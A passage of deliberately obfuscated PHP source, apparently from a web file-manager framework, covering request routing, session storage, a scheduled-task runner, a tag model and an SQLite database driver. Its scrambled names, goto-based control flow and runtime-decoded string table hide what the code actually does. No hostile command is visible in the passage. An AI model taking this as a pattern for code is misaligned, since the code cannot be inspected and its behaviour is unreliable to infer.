$F»¥·öÔ’, $Eá–»ğÛÖÎ); } if (preg_match($CŸË›É›Œ÷[1042] . $Eá–»ğÛÖÎ . $CŸË›É›Œ÷[1043], $EÆ×ßøÂ·Ø, $DèÚ¡Èíó÷)) { if (self::$methods[$CÈ’µğ–Ü¹] == $FÙ»ùÉ‚‚ || self::$methods[$CÈ’µğ–Ü¹] == $CŸË›É›Œ÷[1040] || !empty(self::$maps[$CÈ’µğ–Ü¹]) && in_array($FÙ»ùÉ‚‚, self::$maps[$CÈ’µğ–Ü¹])) { $C¨ŞÍ°‰’ = !0; array_shift($DèÚ¡Èíó÷); if (!is_object(self::$callbacks[$CÈ’µğ–Ü¹])) { $eŠ“ä¥†˜¹ = explode($CŸË›É›Œ÷[8], self::$callbacks[$CÈ’µğ–Ü¹]); $fº¿ùÎÂ¨Ä = end($eŠ“ä¥†˜¹); $A´àÔËöš— = explode($CŸË›É›Œ÷[1041], $fº¿ùÎÂ¨Ä); $fƒƒççù¹× = new $A´àÔËöš—[0](); if (!method_exists($fƒƒççù¹×, $A´àÔËöš—[1])) { echo $CŸË›É›Œ÷[1044]; } else { call_user_func_array(array($fƒƒççù¹×, $A´àÔËöš—[1]), $DèÚ¡Èíó÷); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$CÈ’µğ–Ü¹], $DèÚ¡Èíó÷); if (self::$halts) { return; } } } } $CÈ’µğ–Ü¹++; } } if ($C¨ŞÍ°‰’ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $bÜ‘Ì”‚½¥ =& $_SERVER[İåâé¾]; header($_SERVER[$bÜ‘Ì”‚½¥[1045]] . $bÜ‘Ì”‚½¥[1046]); echo $bÜ‘Ì”‚½¥[1047]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$CŸË›É›Œ÷[437]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto EİòİåÀ¢; AÖ‰Õì®Ü: $CŸË›É›Œ÷ =& $_SERVER[İåâé¾]; $EÆ×ßøÂ·Ø = parse_url($_SERVER[$CŸË›É›Œ÷[437]], PHP_URL_PATH); $FÙ»ùÉ‚‚ = $_SERVER[$CŸË›É›Œ÷[148]]; goto f²³ë‘Š¬©; EİòİåÀ¢: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto d”°ÈÉƒ”; d‰¢Ì¢‡Ú: $C‹×ãÀ½÷‰ = $F…’ñó¡‡[$f™–²è³ÄÆ[523]]; switch ($Dùè´ìÕí°) { case $f™–²è³ÄÆ[17]: self::$handle = Model($f™–²è³ÄÆ[524]); break; case $f™–²è³ÄÆ[525]: self::$handle = new CacheRedis($C›¶âŸÓ­°, $C‹×ãÀ½÷‰); break; case $f™–²è³ÄÆ[526]: self::$handle = new CacheMemcached($C›¶âŸÓ­°, $C‹×ãÀ½÷‰); break; case $f™–²è³ÄÆ[163]: $C›¶âŸÓ­°[$f™–²è³ÄÆ[76]] = $C›¶âŸÓ­°[$f™–²è³ÄÆ[76]] . $f™–²è³ÄÆ[1050]; self::$handle = new CacheFile($C›¶âŸÓ­°, $C‹×ãÀ½÷‰); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto A”…³‰Ò›; c†ÉøÈÑõ : Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $Dùè´ìÕí° = $F…’ñó¡‡[$f™–²è³ÄÆ[1049]]; $C›¶âŸÓ­° = $F…’ñó¡‡[$Dùè´ìÕí°]; goto d‰¢Ì¢‡Ú; a³”œ±¥Õ: $F…’ñó¡‡ = $GLOBALS[$f™–²è³ÄÆ[6]][$f™–²è³ÄÆ[340]]; self::$sessionTime = $F…’ñó¡‡[$f™–²è³ÄÆ[1048]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto c†ÉøÈÑõ ; A”…³‰Ò›: $b¼­õ à’î = new self(); return $b¼­õ à’î; goto EİÙŒšËÂ ; d”°ÈÉƒ”: $f™–²è³ÄÆ =& $_SERVER[İåâé¾]; static $b¼­õ à’î = false; if ($b¼­õ à’î) { return $b¼­õ à’î; } goto a³”œ±¥Õ; EİÙŒšËÂ : } public static function sign($fİ­ÆŠ‚‘Õ = false) { $fİ­ÆŠ‚‘Õ && (self::$sessionSign = $fİ­ÆŠ‚‘Õ); self::init(); return self::$sessionSign; } public static function set($eé¶Çƒà¨Ë, $DáÒÕãÌ˜Ú = false) { self::init(); if (is_array($eé¶Çƒà¨Ë)) { foreach ($eé¶Çƒà¨Ë as $D”ã·¤ƒ => $E¹ï°õáÄ) { array_set_value(self::$data, $D”ã·¤ƒ, $E¹ï°õáÄ); } } else { array_set_value(self::$data, $eé¶Çƒà¨Ë, $DáÒÕãÌ˜Ú); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($EÆÜ´éÓâ = false) { self::init(); if (!$EÆÜ´éÓâ) { return self::$data; } return array_get_value(self::$data, $EÆÜ´éÓâ); } public static function remove($a¡äÁÈÌº¼) { self::init(); unset(self::$data[$a¡äÁÈÌº¼]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[İåâé¾][528])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eåÌ¼æ‡™Â; b‡¤¶¾÷¥‰: http_close(); self::valueSet($c×–İ£ª[1051], $c×–İ£ª[376]); Hook::bind($c×–İ£ª[1053], $c×–İ£ª[1054]); goto C“•›ÜÁö; eåÌ¼æ‡™Â: $c×–İ£ª =& $_SERVER[İåâé¾]; if (self::valueGet($c×–İ£ª[446]) != $c×–İ£ª[376]) { return; } if (self::valueGet($c×–İ£ª[1051]) == $c×–İ£ª[376]) { $DÒ‡ïÚ«Œ = self::valueGet($c×–İ£ª[1052]); if (time() - $DÒ‡ïÚ«Œ > 3600 * 2) { self::restart(); } return; } goto b‡¤¶¾÷¥‰; C“•›ÜÁö: while (!0) { self::cacheClear(); if (self::valueGet($c×–İ£ª[446]) != $c×–İ£ª[376]) { self::valueSet($c×–İ£ª[1051], $c×–İ£ª[402]); self::log($c×–İ£ª[1055]); die; } self::valueSet($c×–İ£ª[1051], $c×–İ£ª[376]); self::valueSet($c×–İ£ª[1052], time()); self::taskRunAll(); sleep(self::valueGet($c×–İ£ª[1056])); } goto E£ÑªííÇˆ; E£ÑªííÇˆ: } public static function restart() { $b©‚’ˆœ– =& $_SERVER[İåâé¾]; http_close(); self::valueSet($b©‚’ˆœ–[446], $b©‚’ˆœ–[402]); sleep(self::valueGet($b©‚’ˆœ–[1056]) + 5); self::valueSet($b©‚’ˆœ–[1051], $b©‚’ˆœ–[402]); self::valueSet($b©‚’ˆœ–[446], $b©‚’ˆœ–[376]); } public static function shutdownEvent() { $BëçÍ±ÕÌã =& $_SERVER[İåâé¾]; self::valueSet($BëçÍ±ÕÌã[1051], $BëçÍ±ÕÌã[402]); self::log($BëçÍ±ÕÌã[1057]); } public static function config($BŞÒôÂ‡ÁÁ, $BÈ¸¾’¼¼ë) { $FÌõæîÅ =& $_SERVER[İåâé¾]; $e¦‰ä£‚ä¾ = 20; $BÈ¸¾’¼¼ë = intval($BÈ¸¾’¼¼ë) <= $e¦‰ä£‚ä¾ ? $e¦‰ä£‚ä¾ : intval($BÈ¸¾’¼¼ë); self::valueSet($FÌõæîÅ[446], $BŞÒôÂ‡ÁÁ); self::valueSet($FÌõæîÅ[1056], $BÈ¸¾’¼¼ë); } private static function taskRunAll() { $D‘áô©‘¤ô =& $_SERVER[İåâé¾]; $eÑ­Ë™…µê = Model($D‘áô©‘¤ô[1058])->listData(); $c»µ³ºšÓ– = count($eÑ­Ë™…µê); for ($D™ÇÜ£Å = 0; $D™ÇÜ£Å < $c»µ³ºšÓ–; $D™ÇÜ£Å++) { $c§•ÙˆŒŠ = $eÑ­Ë™…µê[$D™ÇÜ£Å]; if ($c§•ÙˆŒŠ[$D‘áô©‘¤ô[1059]] != $D‘áô©‘¤ô[376]) { continue; } if (!self::taskTimeCheck($c§•ÙˆŒŠ)) { continue; } self::taskRun($c§•ÙˆŒŠ); } } private static function taskTimeCheck($c”ÙŒï’Ğ) { goto Eá¸íµÁ‡”; aì´“åßİ: $d£‘‚Â¼¸“ = strtotime($eÍÉİ´«”¥[1060] . $b®ŒÁÍí²[$eÍÉİ´«”¥[1061]] . $eÍÉİ´«”¥[1062]) - strtotime($eÍÉİ´«”¥[1063]); $cä‡–…ßğÙ = time() - strtotime(date($eÍÉİ´«”¥[1064]) . $eÍÉİ´«”¥[1065]); $a§¨‹‹œ›ß = $cä‡–…ßğÙ >= $d£‘‚Â¼¸“ && $cä‡–…ßğÙ <= $d£‘‚Â¼¸“ + 3600; goto B¦•£ÑÀ‡«; B¦•£ÑÀ‡«: switch ($b®ŒÁÍí²[$eÍÉİ´«”¥[29]]) { case $eÍÉİ´«”¥[1066]: if (time() - $a§±‘à¹›¶ < 3600 * 24 * 30) { return !1; } if ($b®ŒÁÍí²[$eÍÉİ´«”¥[1066]] == date($eÍÉİ´«”¥[1067]) && $a§¨‹‹œ›ß) { return !0; } break; case $eÍÉİ´«”¥[1068]: if (time() - $a§±‘à¹›¶ < 3600 * 24 * 7) { return !1; } $F©”ò“âÜ = date($eÍÉİ´«”¥[1069]) == 0 ? 7 : date($eÍÉİ´«”¥[1069]); if ($b®ŒÁÍí²[$eÍÉİ´«”¥[1068]] == $F©”ò“âÜ && $a§¨‹‹œ›ß) { return !0; } break; case $eÍÉİ´«”¥[1061]: if (time() - $a§±‘à¹›¶ < 3600 * 24) { return !1; } if ($a§¨‹‹œ›ß) { return !0; } break; case $eÍÉİ´«”¥[1070]: if (time() - $a§±‘à¹›¶ >= floatval($b®ŒÁÍí²[$eÍÉİ´«”¥[1070]]) * 60) { return !0; } break; default: break; } return !1; goto E³´ÀƒŸ¤¨; Eá¸íµÁ‡”: $eÍÉİ´«”¥ =& $_SERVER[İåâé¾]; $b®ŒÁÍí² = json_decode($c”ÙŒï’Ğ[$eÍÉİ´«”¥[189]], !0); $a§±‘à¹›¶ = intval($c”ÙŒï’Ğ[$eÍÉİ´«”¥[1052]]); goto aì´“åßİ; E³´ÀƒŸ¤¨: } public static function taskRun($CËÔå‡õ¨») { goto B  ²ä³´; C©ÜÎÈÚ‚: Model($bÛä­ë»™Š[1075])->add(array($bÛä­ë»™Š[1076] => $bÛä­ë»™Š[33], $bÛä­ë»™Š[1077] => $bÛä­ë»™Š[402], $bÛä­ë»™Š[29] => $bÛä­ë»™Š[1078] . $CËÔå‡õ¨»[$bÛä­ë»™Š[368]], $bÛä­ë»™Š[1079] => json_encode(array($bÛä­ë»™Š[28] => $CËÔå‡õ¨»[$bÛä­ë»™Š[28]], $bÛä­ë»™Š[1080] => timeFloat() - $EÊĞ•Ç“, $bÛä­ë»™Š[284] => $F°†‰İã°â)))); self::log($bÛä­ë»™Š[1081] . $CËÔå‡õ¨»[$bÛä­ë»™Š[368]] . $bÛä­ë»™Š[1082] . $F°†‰İã°â); return !0; goto CÈ…ìİæôÅ; B  ²ä³´: $bÛä­ë»™Š =& $_SERVER[İåâé¾]; self::log($bÛä­ë»™Š[1071] . $CËÔå‡õ¨»[$bÛä­ë»™Š[368]] . $bÛä­ë»™Š[1072] . $CËÔå‡õ¨»[$bÛä­ë»™Š[28]] . $bÛä­ë»™Š[1073] . $CËÔå‡õ¨»[$bÛä­ë»™Š[1074]]); Model($bÛä­ë»™Š[1058])->run($CËÔå‡õ¨»[$bÛä­ë»™Š[368]]); goto B¹éâà÷Œå; B¹éâà÷Œå: $EÊĞ•Ç“ = timeFloat(); $F°†‰İã°â = $bÛä­ë»™Š[33]; switch ($CËÔå‡õ¨»[$bÛä­ë»™Š[29]]) { case $bÛä­ë»™Š[298]: $fŞÏ—ØÚº = url_request($CËÔå‡õ¨»[$bÛä­ë»™Š[1074]], $bÛä­ë»™Š[222], !1, !1, !1, !1, 5); $F°†‰İã°â = strlen($fŞÏ—ØÚº); break; case $bÛä­ë»™Š[221]: $F°†‰İã°â = Hook::apply($CËÔå‡õ¨»[$bÛä­ë»™Š[1074]]); default: break; } goto C©ÜÎÈÚ‚; CÈ…ìİæôÅ: } private static function valueGet($eÇïÄŒ¾œÎ) { $F²¾„«ÄÂ¾ =& $_SERVER[İåâé¾]; $dâÕí¾¤ƒ = $F²¾„«ÄÂ¾[1083]; $d’‘Ç¹ç’à = Model($F²¾„«ÄÂ¾[1084])->get($eÇïÄŒ¾œÎ, $dâÕí¾¤ƒ); if (is_null($d’‘Ç¹ç’à)) { Model($F²¾„«ÄÂ¾[1084])->set($F²¾„«ÄÂ¾[1056], 10, $dâÕí¾¤ƒ); Model($F²¾„«ÄÂ¾[1084])->set($F²¾„«ÄÂ¾[446], $F²¾„«ÄÂ¾[376], $dâÕí¾¤ƒ); Model($F²¾„«ÄÂ¾[1084])->set($F²¾„«ÄÂ¾[1051], $F²¾„«ÄÂ¾[402], $dâÕí¾¤ƒ); $d’‘Ç¹ç’à = Model($F²¾„«ÄÂ¾[1084])->get($eÇïÄŒ¾œÎ, $dâÕí¾¤ƒ); } return $d’‘Ç¹ç’à; } private static function valueSet($aîÎå™ÂÇˆ, $AŒîŠ÷ïÍ) { $D¹‹„™ø«º =& $_SERVER[İåâé¾]; return Model($D¹‹„™ø«º[1084])->set($aîÎå™ÂÇˆ, $AŒîŠ÷ïÍ, $D¹‹„™ø«º[1083]); } protected static function log($fÅõÅóÁÆÎ) { write_log($fÅõÅóÁÆÎ, $_SERVER[İåâé¾][1085]); } private static function cacheClear() { $Fõ‡²ÖŞâ =& $_SERVER[İåâé¾]; $e…‘¦—ˆ†¡ = Model($Fõ‡²ÖŞâ[1084])->cacheKey($Fõ‡²ÖŞâ[1083]); Cache::clearMemory($e…‘¦—ˆ†¡); } } goto Bâ§ÅÆ¥¢; B®ê±ŠÉÂÙ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\x74\141\x67\x4c\x69\x73\164"; public $modelType = "\x55\x73\145\162\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\x79\x6c\x65", "\163\157\162\164"); public function listData($AÕôø‚’Úà = false, $eòé´ô’»‡ = "\x73\157\162\164", $CÂÃ°ÕÁŠÉ = false) { return parent::listData($AÕôø‚’Úà, $eòé´ô’»‡, $CÂÃ°ÕÁŠÉ); } public function remove($D±¶èÖè‚¤) { return parent::remove($D±¶èÖè‚¤); } public function add($dš†•²ÁÁ, $Aê¸¯¹Í¹› = "\154\141\x62\145\x6c\x2d\x67\162\145\171\55\156\x6f\162\155\x61\x6c") { $dÁÊË˜ù =& $_SERVER[İåâé¾]; if ($this->findByName($dš†•²ÁÁ)) { return !1; } $EÃÛƒ×ê²‡ = array($dÁÊË˜ù[387] => $dš†•²ÁÁ, $dÁÊË˜ù[1968] => $Aê¸¯¹Í¹›, $dÁÊË˜ù[1546] => $this->getSort($dÁÊË˜ù[249]) + 1); return parent::insert($EÃÛƒ×ê²‡); } public function update($Cßà—Áë§¾, $EÆÏ¿ö­™) { $Aç‚Ñ¥•Œ =& $_SERVER[İåâé¾]; $C©÷Ñ›Ãî = $this->listData($Cßà—Áë§¾); $E©´©­»š = $this->findByName($EÆÏ¿ö­™[$Aç‚Ñ¥•Œ[28]]); if (!$C©÷Ñ›Ãî || $E©´©­»š && $E©´©­»š[$Aç‚Ñ¥•Œ[368]] != $C©÷Ñ›Ãî[$Aç‚Ñ¥•Œ[368]]) { return !1; } return parent::update($Cßà—Áë§¾, $EÆÏ¿ö­™); } public function moveTop($Bß” ÌãêÇ) { $a›ˆµ¯‡ =& $_SERVER[İåâé¾]; $D»Ì´æ¸‘Ó = parent::listData(); $E±Ç‹´­Ê£ = $this->getSort($a›ˆµ¯‡[248]); foreach ($D»Ì´æ¸‘Ó as &$Dİ©‰Ä±›ö) { if ($Dİ©‰Ä±›ö[$a›ˆµ¯‡[368]] == $Bß” ÌãêÇ) { $Dİ©‰Ä±›ö[$a›ˆµ¯‡[1563]] = $E±Ç‹´­Ê£; continue; } $Dİ©‰Ä±›ö[$a›ˆµ¯‡[1563]] += 1; } return parent::resetData($D»Ì´æ¸‘Ó); } public function moveBottom($C®£—•Œ´) { $eÈ¦İãŸ³ò =& $_SERVER[İåâé¾]; $D¯‰Ë’•¼ = $this->getSort($eÈ¦İãŸ³ò[249]) + 1; return parent::update($C®£—•Œ´, array($eÈ¦İãŸ³ò[1563] => $D¯‰Ë’•¼)); } public function resetSort($dø¦ñ±ƒàÙ) { $bæ¥¯†áŸ =& $_SERVER[İåâé¾]; $bÂ£ˆÖ‡ª‹ = array(); for ($fùÄŸÒ­„‰ = 0; $fùÄŸÒ­„‰ < count($dø¦ñ±ƒàÙ); $fùÄŸÒ­„‰++) { $bÂ£ˆÖ‡ª‹[$dø¦ñ±ƒàÙ[$fùÄŸÒ­„‰] . $bæ¥¯†áŸ[33]] = $fùÄŸÒ­„‰ + 1; } $cÏùÈ¶ª›è = parent::listData(); foreach ($cÏùÈ¶ª›è as &$EŠ˜‹¼™ˆì) { $B÷­Œ‰ñ = $bÂ£ˆÖ‡ª‹[$EŠ˜‹¼™ˆì[$bæ¥¯†áŸ[368]]]; $EŠ˜‹¼™ˆì[$bæ¥¯†áŸ[1563]] = $B÷­Œ‰ñ ? $B÷­Œ‰ñ : $EŠ˜‹¼™ˆì[$bæ¥¯†áŸ[1563]]; } return parent::resetData($cÏùÈ¶ª›è); } private function getSort($AÎùàÌØ¤ô) { $e‹«Ö½íÉ‘ =& $_SERVER[İåâé¾]; $b¾ÄÃ·æÉ = parent::listData(); $aÒ‰ì¨¶Ä† = array_to_keyvalue($b¾ÄÃ·æÉ, $e‹«Ö½íÉ‘[33], $e‹«Ö½íÉ‘[1563]); if (!$aÒ‰ì¨¶Ä†) { $aÒ‰ì¨¶Ä† = array(0); } $bè¥‚ÙÍ = $AÎùàÌØ¤ô == $e‹«Ö½íÉ‘[249] ? max($aÒ‰ì¨¶Ä†) : min($aÒ‰ì¨¶Ä†); return intval($bè¥‚ÙÍ); } } goto eÆàò™ˆ³; d„Çà¼Âç´: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bÛ¡Ò„ò = false, $EìèÚµíÕÉ = '', $F…Ô ˜æ‘Å = false) { goto FŸæ¤Ù•ğê; f«øƒï¨¾: foreach ($EÅ¦â¢ÃÜ¡ as $cÅ³­Å£„‚ => $E•©†‚ì ¹) { if ($F…Ô ˜æ‘Å || in_array($cÅ³­Å£„‚, $this->jsonField)) { $EÅ¦â¢ÃÜ¡[$cÅ³­Å£„‚] = json_decode($EÅ¦â¢ÃÜ¡[$cÅ³­Å£„‚], !0); } } $this->cacheSet($EìèÚµíÕÉ, $EÅ¦â¢ÃÜ¡); return $bÛ¡Ò„ò ? $EÅ¦â¢ÃÜ¡[$bÛ¡Ò„ò] : $EÅ¦â¢ÃÜ¡; goto EÎùÙãÌØ±; FŸæ¤Ù•ğê: $E¢…ï­…œ =& $_SERVER[İåâé¾]; $EÅ¦â¢ÃÜ¡ = $this->cacheGet($EìèÚµíÕÉ); if (is_array($EÅ¦â¢ÃÜ¡)) { return $bÛ¡Ò„ò ? $EÅ¦â¢ÃÜ¡[$bÛ¡Ò„ò] : $EÅ¦â¢ÃÜ¡; } goto a™•©ÈÍ‘Ç; a™•©ÈÍ‘Ç: $DÎíÌÍ¥Ïì = $this->filterWhere(array($E¢…ï­…œ[29] => $EìèÚµíÕÉ)); $EÅ¦â¢ÃÜ¡ = $this->where($DÎíÌÍ¥Ïì)->select(); $EÅ¦â¢ÃÜ¡ = array_to_keyvalue($EÅ¦â¢ÃÜ¡, $E¢…ï­…œ[88], $E¢…ï­…œ[359]); goto f«øƒï¨¾; EÎùÙãÌØ±: } public function set($f¸ÌË¢‹·, $Cª®Äéº = false, $bšôÓÅÖÕ¥ = '') { $D–ÜƒÑø®Ø =& $_SERVER[İåâé¾]; $this->cacheRemove($bšôÓÅÖÕ¥); $AÁø†ŠØÀÖ = array(); $A¤«–³÷Ùó = is_array($f¸ÌË¢‹·) ? $f¸ÌË¢‹· : array($f¸ÌË¢‹· => $Cª®Äéº); foreach ($A¤«–³÷Ùó as $f¸ÌË¢‹· => $eÓ‚‡ÕÕ„Ø) { if (is_array($eÓ‚‡ÕÕ„Ø)) { $eÓ‚‡ÕÕ„Ø = json_encode_force($eÓ‚‡ÕÕ„Ø); } $eÓ‚‡ÕÕ„Ø = self::textEncode($eÓ‚‡ÕÕ„Ø); $A¤«–³÷Ùó = array($D–ÜƒÑø®Ø[29] => $bšôÓÅÖÕ¥, $D–ÜƒÑø®Ø[88] => $f¸ÌË¢‹·, $D–ÜƒÑø®Ø[359] => $eÓ‚‡ÕÕ„Ø); $AÁø†ŠØÀÖ[] = $this->filterWhere($A¤«–³÷Ùó); } return $this->addAll($AÁø†ŠØÀÖ, array(), !0); } public function setDeep($báÌÓ«»“§, $BÊ ùİÉ­À = false, $A¨âò¡¨¸© = '') { $c‰Îœ×—Ô = explode($_SERVER[İåâé¾][90], $báÌÓ«»“§); $DÏŠ­ô¢´ê = $this->get(); array_set_value($DÏŠ­ô¢´ê, $báÌÓ«»“§, $BÊ ùİÉ­À); $this->set($c‰Îœ×—Ô[0], $DÏŠ­ô¢´ê[$c‰Îœ×—Ô[0]], $A¨âò¡¨¸©); } public function remove($bª¦µìæ½Ô, $eá«»§ğÙŸ = '') { $A„Ÿ·øÓè¼ =& $_SERVER[İåâé¾]; $this->CacheRemove($eá«»§ğÙŸ); $eåˆ®‚È‹ = $this->filterWhere(array($A„Ÿ·øÓè¼[88] => $bª¦µìæ½Ô, $A„Ÿ·øÓè¼[29] => $eá«»§ğÙŸ)); if (is_null($bª¦µìæ½Ô)) { unset($eåˆ®‚È‹[$A„Ÿ·øÓè¼[88]]); } return $this->where($eåˆ®‚È‹)->delete(); } public function cacheSet($A‡ÈÍØó—ƒ, $F¾”Ç²• = false) { return Cache::set($this->cacheKey($A‡ÈÍØó—ƒ), $F¾”Ç²•); } public function cacheGet($bò¢“«ò) { return Cache::get($this->cacheKey($bò¢“«ò)); } public function cacheRemove($CØ²ƒ°ë—) { return Cache::remove($this->cacheKey($CØ²ƒ°ë—)); } protected function filterWhere($f®¦Ò´±¸) { return $f®¦Ò´±¸; } protected function cacheKey($cÙ¤†‡£ƒß) { return $cÙ¤†‡£ƒß; } } define($_SERVER[İåâé¾][369], $_SERVER[İåâé¾][370]); $_SERVER[óÚ‚£ñ¶] = explode($_SERVER[İåâé¾][371], gzinflate(substr($_SERVER[İåâé¾][372], 10, -8))); goto cùÑÃ·áÎ; B‘ª ñçØ: define($_SERVER[İåâé¾][1327], 3); define($_SERVER[İåâé¾][1328], 4); define($_SERVER[İåâé¾][1329], 5); goto Cá¬Ô²¤²‡; eİİ»„Ü£‰: function ActionCall($d’äù†Ë) { $E×“Ï¶¥™™ = array_slice(func_get_args(), 1); return ActionApply($d’äù†Ë, $E×“Ï¶¥™™); } function ActionCallHook($AÕİ´´Ñ‹) { goto AùŸ‰†Íò±; F½†¤Åç‡ô: $eÒ‰®Á×†Ù = $Eöù§ë™ ? json_decode($Eöù§ë™, !0) : $eÒ‰®Á×†Ù; $GLOBALS[$cïÑ’êˆ½[20]] = 0; return $eÒ‰®Á×†Ù; goto eğ¢õ£¿£–; AùŸ‰†Íò±: $cïÑ’êˆ½ =& $_SERVER[•¡£]; ob_start(); $D“”òµ±ÌÑ = array_slice(func_get_args(), 1); goto FĞİ‚‚‹³; FĞİ‚‚‹³: $GLOBALS[$cïÑ’êˆ½[20]] = 1; $eÒ‰®Á×†Ù = ActionApply($AÕİ´´Ñ‹, $D“”òµ±ÌÑ); $Eöù§ë™ = ob_get_clean(); goto F½†¤Åç‡ô; eğ¢õ£¿£–: } function beforeShutdown() { Hook::trigger($_SERVER[•¡£][21]); } goto dÅÅÔÉœƒ”; bÄĞ¹¡âÙ…: class DbSqlite3Base extends Db { public function __construct($aò‰¼Ë•–» = '') { $BùßÔ”ßÃõ =& $_SERVER[İåâé¾]; if (!class_exists($BùßÔ”ßÃõ[51])) { think_exception(think_lang($BùßÔ”ßÃõ[10]) . $BùßÔ”ßÃõ[52]); } if (!empty($aò‰¼Ë•–»)) { if (!isset($aò‰¼Ë•–»[$BùßÔ”ßÃõ[12]])) { $aò‰¼Ë•–»[$BùßÔ”ßÃõ[12]] = 438; } $this->config = $aò‰¼Ë•–»; if (empty($this->config[$BùßÔ”ßÃõ[13]])) { $this->config[$BùßÔ”ßÃõ[13]] = array(); } } } public function connect($e„öÁ´×ÏÏ = '', $F­æŸÏËÔ = 0) { $AŠä£¤Ù¥¬ =& $_SERVER[İåâé¾]; if (!isset($this->linkID[$F­æŸÏËÔ])) { if (empty($e„öÁ´×ÏÏ)) { $e„öÁ´×ÏÏ = $this->config; } $this->linkID[$F­æŸÏËÔ] = new SQLite3($e„öÁ´×ÏÏ[$AŠä£¤Ù¥¬[17]]); if (!$this->linkID[$F­æŸÏËÔ]) { think_exception($this->linkID[$F­æŸÏËÔ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$F­æŸÏËÔ]->busyTimeout(30000); if (1 != think_config($AŠä£¤Ù¥¬[18])) { unset($this->config); } } return $this->linkID[$F­æŸÏËÔ]; } public function free() { $this->queryID = null; } public function query($Dß©ˆ‚·¨µ) { goto e„²½ÌçÌŞ; B©ê™Â…Üø: if (!1 === $this->queryID) { $this->error(); return !1; } else { $c²Ä­ÔòÚ = $this->getAll(); $this->numRows = count($c²Ä­ÔòÚ); return $c²Ä­ÔòÚ; } goto EßÁÁ°••º; A©š¾ğ’«: $this->queryStr = $Dß©ˆ‚·¨µ; if ($this->queryID) { $this->free(); } think_action_status($fÍÕ—‘‘ÛŸ[19], 1); goto Câ‰àÅº‰Ğ; e„²½ÌçÌŞ: $fÍÕ—‘‘ÛŸ =& $_SERVER[İåâé¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A©š¾ğ’«; Câ‰àÅº‰Ğ: think_status($fÍÕ—‘‘ÛŸ[20]); $this->queryID = $this->_linkID->query($Dß©ˆ‚·¨µ); $this->debug(); goto B©ê™Â…Üø; EßÁÁ°••º: } public function execute($CÂÒß‰àÉ) { goto CßíŠâÀğ×; b•¯–‹Ä¾: $this->queryStr = $CÂÒß‰àÉ; if ($this->queryID) { $this->free(); } think_action_status($BæãÎ‚õÒß[21], 1); goto f®áß­®‰; CßíŠâÀğ×: $BæãÎ‚õÒß =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b•¯–‹Ä¾; bÊìÑ‰¡‹†: if (!1 === $CµßØÌÏÉ¨) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DĞ åÈ”„; f®áß­®‰: think_status($BæãÎ‚õÒß[20]); $CµßØÌÏÉ¨ = $this->_linkID->exec($CÂÒß‰àÉ); $this->debug(); goto bÊìÑ‰¡‹†; DĞ åÈ”„: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[İåâé¾][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EÎœ¸¤‰Ó = $this->_linkID->query($_SERVER[İåâé¾][23]); if (!$EÎœ¸¤‰Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fòæÚŒ  = $this->_linkID->query($_SERVER[İåâé¾][24]); if (!$fòæÚŒ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d‹ò¶Çö× = array(); while ($a³©òî˜Õ´ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $d‹ò¶Çö×[] = $a³©òî˜Õ´; } $this->queryID->reset(); return $d‹ò¶Çö×; } public function getFields($DÆì°Éë“£) { $B‰Ü»İ„Ë« =& $_SERVER[İåâé¾]; $A«”Íµ„‹› = $this->query($B‰Ü»İ„Ë«[25] . $DÆì°Éë“£ . $B‰Ü»İ„Ë«[26]); $B‡ï‡Û = array(); if ($A«”Íµ„‹›) { foreach ($A«”Íµ„‹› as $d¿–‘Ê–¸ö => $B£¾ƒ…Âæ‚) { $B‡ï‡Û[$B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[28]]] = array($B‰Ü»İ„Ë«[28] => $B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[28]], $B‰Ü»İ„Ë«[29] => $B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[29]], $B‰Ü»İ„Ë«[31] => (bool) ($B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[31]] === $B‰Ü»İ„Ë«[33]), $B‰Ü»İ„Ë«[34] => $B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[53]], $B‰Ü»İ„Ë«[36] => (bool) $B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[54]], $B‰Ü»İ„Ë«[39] => (bool) $B£¾ƒ…Âæ‚[$B‰Ü»İ„Ë«[54]]); } } return $B‡ï‡Û; } public function getTables($c§éæ¸Ø¡å = '') { 